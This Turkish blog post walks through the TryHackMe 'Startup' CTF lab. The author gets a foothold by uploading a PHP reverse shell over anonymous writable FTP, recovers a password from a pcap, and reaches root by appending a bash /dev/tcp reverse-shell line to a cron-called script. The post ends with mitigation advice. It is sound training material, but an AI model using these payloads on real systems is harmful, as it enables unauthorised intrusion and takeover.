# TryHackMe: Startup — FTP'den Web Shell'e, Wireshark'tan Root'a

Siber güvenlik tarafına geçiş yapan bir yazılımcıyım. Bu makine FTP'ye yazma izni olan anonim erişim, web shell yükleme, pcap dosyasından credential çıkarma ve cron job istismarı gibi farklı teknikleri bir arada kullandığım bir CTF oldu.

## Keşif

Nmap taramasıyla başladım. 3 açık port buldum:

- **21 (FTP)** — vsFTPd 3.0.3, anonymous login açık
- **22 (SSH)** — OpenSSH 7.2p2
- **80 (HTTP)** — Apache 2.4.18

FTP'de anonymous erişim açık. Hemen bağlandım ve baktığımda birkaç dosya ve bir `ftp` klasörü gördüm. Ama asıl önemli olan şu: bu FTP dizinine **yazma iznim** vardı. Dosya yükleyebiliyordum.

## Web Tarafı ve FTP Bağlantısı

Web sitesine baktığımda standart bir sayfa vardı. Gobuster ile dizin taraması yaptığımda `/files` dizinini buldum. Bu dizinin içeriği FTP'deki dosyalarla aynıydı. Yani FTP'ye yüklediğim dosyalar web üzerinden erişilebilir durumda.

Bu çok önemli bir bulgu: FTP'ye PHP dosyası yükleyebilirsem ve web üzerinden o dosyaya gidersem, sunucuda kod çalıştırabilirim.

## Web Shell ile Giriş

Pentestmonkey'nin PHP reverse shell'ini kullandım. Dosyayı FTP ile `ftp` dizinine yükledim:

```
ftp HEDEF_IP
put reverse-shell.php
```

Kali tarafında netcat listener açtım:

```
nc -lvnp 4444
```

Tarayıcıdan `http://HEDEF_IP/files/ftp/reverse-shell.php` adresine gittim ve shell geldi. `www-data` kullanıcısı olarak sistemdeydim.

Bu tür bir açık aslında çok yaygın. FTP ve web sunucusu aynı dizini paylaşıyorsa ve FTP'ye anonim yazma izni varsa, herkes web shell yükleyebilir.

## Wireshark ile Şifre Bulma

Sistemi enumerate ederken `/incidents` adında bir dizin buldum. İçinde `suspicious.pcapng` dosyası vardı. Bu bir ağ yakalama dosyası, yani birisi bu makinede daha önce ağ trafiğini kaydetmiş.

Dosyayı kendi makineme aktardım ve Wireshark ile incelediğimde içinde plaintext olarak bir şifre gördüm: `c4ntg3t3n0ughsp1c3`. Bu şifre `lennie` kullanıcısına ait.

SSH ile lennie olarak giriş yaptım ve user flag'i aldım.

Burada öğrenilen ders: pcap dosyaları her zaman ilgi çekicidir. Ağ yakalama dosyalarında şifreler, token'lar, API key'leri plaintext olarak bulunabilir. Wireshark'ta "Follow TCP Stream" ile konuşmaları okumak çok işe yarıyor.

## Yetki Yükseltme — Cron Job İstismarı

Lennie'nin home dizininde `scripts` klasörü vardı. İçinde `planner.sh` adında bir script çalışıyordu ve bu script `/etc/print.sh` dosyasını çağırıyordu. `planner.sh`'ı root'un bir cron job olarak düzenli aralıklarla çalıştırdığını anladım.

`planner.sh`'ı düzenleyemiyordum ama `/etc/print.sh` dosyasına yazma iznim vardı. Bu dosyanın içine reverse shell payload'ı ekledim:

```bash
bash -i >& /dev/tcp/SALDIRGAN_IP/6666 0>&1
```

Kali'de yeni bir listener açtım:

```
nc -lvnp 6666
```

Birkaç dakika bekledikten sonra cron job tetiklendi ve root shell geldi. Root flag'i aldım, makine tamamen ele geçirildi.

## Kapanış ve Geliştirici Gözünden

Bu makinede FTP'den web shell yükleyerek giriş yaptım, bir pcap dosyasından şifre çıkardım ve yanlış yapılandırılmış bir cron job ile root oldum.

Bir yazılımcı olarak bu açıkların nasıl önlenebileceğine bakmak istiyorum:

- **FTP Anonim Yazma İzni:** Anonymous kullanıcıya yazma izni vermek, özellikle web diziniyle paylaşılan bir klasörde, doğrudan remote code execution demek. Anonymous erişim kapatılmalı veya en azından sadece okuma izni verilmeli.
- **Plaintext Credentials:** Ağ üzerinde şifrelerin plaintext olarak geçmesi Wireshark ile yakalanmasını kolaylaştırıyor. Her zaman şifreli protokoller (HTTPS, SFTP, SSH) kullanılmalı.
- **Cron Job Güvenliği:** Root'un çalıştırdığı scriptler, düşük yetkili kullanıcıların yazabildiği dosyaları çağırmamalı. Cron job'larda çağrılan her dosyanın izinleri kontrol edilmeli ve sadece root'un yazabilmesi sağlanmalı.
